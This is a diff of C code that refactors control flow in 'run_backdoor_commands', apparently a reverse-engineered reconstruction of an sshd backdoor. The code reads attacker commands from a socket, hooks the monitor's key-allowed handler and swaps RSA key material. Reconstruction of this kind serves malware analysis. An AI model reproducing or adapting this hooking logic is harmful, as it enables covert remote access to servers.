@@ -458,110 +458,127 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 
 										if(f.u.sock.socket_fd < 0) break;
-										if(!ctx->libc_imports) break;
-										if(!ctx->libc_imports->pselect) break;
-										if(!ctx->libc_imports->__errno_location) break;
+										do {
+											if(!ctx->libc_imports) break;
+											if(!ctx->libc_imports->pselect) break;
+											if(!ctx->libc_imports->__errno_location) break;
 
-										int res;
-										for(;;){
-											*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
-											memset(&f.data, 0x00, 0x80);
-											FD_SET(f.u.sock.socket_fd, (fd_set *)&f.data);
-											*(struct timespec *)&f.u.sock.fd_recv_buf[8] = (struct timespec){
-												.tv_sec = 0
-											};
-											if((res = ctx->libc_imports->pselect(
-												f.u.sock.socket_fd + 1,
-												&f.data.fd_set,
-												NULL, NULL,
-												(const struct timespec *)&f.u.sock.fd_recv_buf[8],
-												NULL
-											)) >= 0) break;
-											if(*ctx->libc_imports->__errno_location() != EINTR){
-												goto bad_data;
-											}
-										}
-										if(!res) break;
-										if(!FD_ISSET(f.u.sock.socket_fd, &f.data.fd_set)) break;
-
-										if(fd_read(
-											f.u.sock.socket_fd,
-											f.u.sock.fd_recv_buf,
-											sizeof(u32),
-											ctx->libc_imports
-										) < 0) break;
-
-										*(u32 *)f.u.sock.fd_recv_buf = __builtin_bswap32(*(u32 *)f.u.sock.fd_recv_buf);
-										if((*(u32*)f.u.sock.fd_recv_buf - 1) > 64) break;
-
-										if(fd_read(
-											f.u.sock.socket_fd,
-											&f.unk57,
-											sizeof(u8),
-											ctx->libc_imports
-										) < 0) break;
-
-										ctx->sock_read_buf_size = *(u32 *)f.u.sock.fd_recv_buf - 1;
-										if(fd_read(
-											f.u.sock.socket_fd,
-											ctx->sock_read_buf,
-											ctx->sock_read_buf_size,
-											ctx->libc_imports
-										) < 0) break;
-
-										if(!ctx->sshd_ctx->mm_answer_keyallowed) break;
-
-										int monitor_reqtype;
-										if(TEST_FLAG(f.kctx.args.flags3, 0x3F)){
-											monitor_reqtype = 2 * (f.kctx.args.flags3 & 0x3F);
-										} else {
-											monitor_reqtype = MONITOR_REQ_KEYALLOWED;
-											if(ctx->sshd_ctx->mm_answer_keyallowed_ptr){
-												int *monitor_reqtype_ptr = (int *)PTRDIFF(ctx->sshd_ctx->mm_answer_keyallowed_ptr, 8);
-												monitor_reqtype = *monitor_reqtype_ptr;
-											}
-										}
-										ctx->sshd_ctx->mm_answer_keyallowed_reqtype = monitor_reqtype + 1;
-
-										// replace/hook mm_answer_keyallowed
-										ctx->sshd_ctx->mm_answer_keyallowed_ptr = ctx->sshd_ctx->mm_answer_keyallowed;
-
-										post_exec:
-										memset(&f.data, 0x00, 0xF0);
-
-										f.data.data[0] = 0x80;
-										f.data.data[0xF6] = 8;
-										f.data.data[0xFF] = 1;
-										BIGNUM *rsa_e, *rsa_n;
-										rsa_e = ctx->imported_funcs->BN_bin2bn(
-											f.u.sock.fd_recv_buf,
-											1, NULL);
-										if(rsa_e){
-											rsa_n = ctx->imported_funcs->BN_bin2bn(
-												(u8 *)&f.data,
-												256, NULL
-											);
-											if(rsa_n){
-												if(ctx->imported_funcs->RSA_set0_key(
-													f.rsa,
-													rsa_n, rsa_e,
+											bool do_break = false;
+											int res;
+											for(;;){
+												*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
+												memset(&f.data, 0x00, 0x80);
+												FD_SET(f.u.sock.socket_fd, (fd_set *)&f.data);
+												*(struct timespec *)&f.u.sock.fd_recv_buf[8] = (struct timespec){
+													.tv_sec = 0
+												};
+												if((res = ctx->libc_imports->pselect(
+													f.u.sock.socket_fd + 1,
+													&f.data.fd_set,
+													NULL, NULL,
+													(const struct timespec *)&f.u.sock.fd_recv_buf[8],
 													NULL
-												) == TRUE) goto disable_backdoor;
-												break;
+												)) >= 0) break;
+												if(*ctx->libc_imports->__errno_location() != EINTR){
+													do_break = true;
+													break;
+												}
+											}
+											if(do_break) break;
+											if(!res) break;
+											if(!FD_ISSET(f.u.sock.socket_fd, &f.data.fd_set)) break;
+
+											if(fd_read(
+												f.u.sock.socket_fd,
+												f.u.sock.fd_recv_buf,
+												sizeof(u32),
+												ctx->libc_imports
+											) < 0) break;
+
+											*(u32 *)f.u.sock.fd_recv_buf = __builtin_bswap32(*(u32 *)f.u.sock.fd_recv_buf);
+											if((*(u32*)f.u.sock.fd_recv_buf - 1) > 64) break;
+
+											if(fd_read(
+												f.u.sock.socket_fd,
+												&f.unk57,
+												sizeof(u8),
+												ctx->libc_imports
+											) < 0) break;
+
+											ctx->sock_read_buf_size = *(u32 *)f.u.sock.fd_recv_buf - 1;
+											if(fd_read(
+												f.u.sock.socket_fd,
+												ctx->sock_read_buf,
+												ctx->sock_read_buf_size,
+												ctx->libc_imports
+											) < 0) break;
+
+											if(!ctx->sshd_ctx->mm_answer_keyallowed) break;
+
+											int monitor_reqtype;
+											if(TEST_FLAG(f.kctx.args.flags3, 0x3F)){
+												monitor_reqtype = 2 * (f.kctx.args.flags3 & 0x3F);
+											} else {
+												monitor_reqtype = MONITOR_REQ_KEYALLOWED;
+												if(ctx->sshd_ctx->mm_answer_keyallowed_ptr){
+													int *monitor_reqtype_ptr = (int *)PTRDIFF(ctx->sshd_ctx->mm_answer_keyallowed_ptr, 8);
+													monitor_reqtype = *monitor_reqtype_ptr;
+												}
+											}
+											ctx->sshd_ctx->mm_answer_keyallowed_reqtype = monitor_reqtype + 1;
+
+											// replace/hook mm_answer_keyallowed
+											ctx->sshd_ctx->mm_answer_keyallowed_ptr = ctx->sshd_ctx->mm_answer_keyallowed;
+
+											post_exec:
+											memset(&f.data, 0x00, 0xF0);
+
+											f.data.data[0] = 0x80;
+											f.data.data[0xF6] = 8;
+											f.data.data[0xFF] = 1;
+											BIGNUM *rsa_e, *rsa_n;
+											rsa_e = ctx->imported_funcs->BN_bin2bn(
+												f.u.sock.fd_recv_buf,
+												1, NULL);
+											if(rsa_e){
+												rsa_n = ctx->imported_funcs->BN_bin2bn(
+													(u8 *)&f.data,
+													256, NULL
+												);
+												if(rsa_n){
+													if(ctx->imported_funcs->RSA_set0_key(
+														f.rsa,
+														rsa_n, rsa_e,
+														NULL
+													) == TRUE) goto disable_backdoor;
+													break;
+												}
+											}
+
+										} while(0);
+
+										ctx->disable_backdoor = TRUE;
+										memset(f.kctx.ed448_key, 0x00, sizeof(f.kctx.ed448_key));
+										if(!TEST_FLAG(f.kctx.args.flags1, 0x1)){
+											goto exit;
+										}
+										if(ctx->libc_imports){
+											if(ctx->libc_imports->exit){
+												ctx->libc_imports->exit(0);
 											}
 										}
-
+										return FALSE;
 									}
 								}
-
-
-								
+								v = offsets.value | 0xFF0000;
+								tmp.fields.kex.kex_qword_index = -1;
+								goto have_offsets;
 							}
 						}
 					}
 				} while(0);
 				
-			} else {
+			} else { /* cmd_type == 2 */
 				if(cmd_type != 3 || TEST_FLAG(f.kctx.args.flags2, 0x40)){
 					data_s1 = 0;
 					data_s2 = 0;
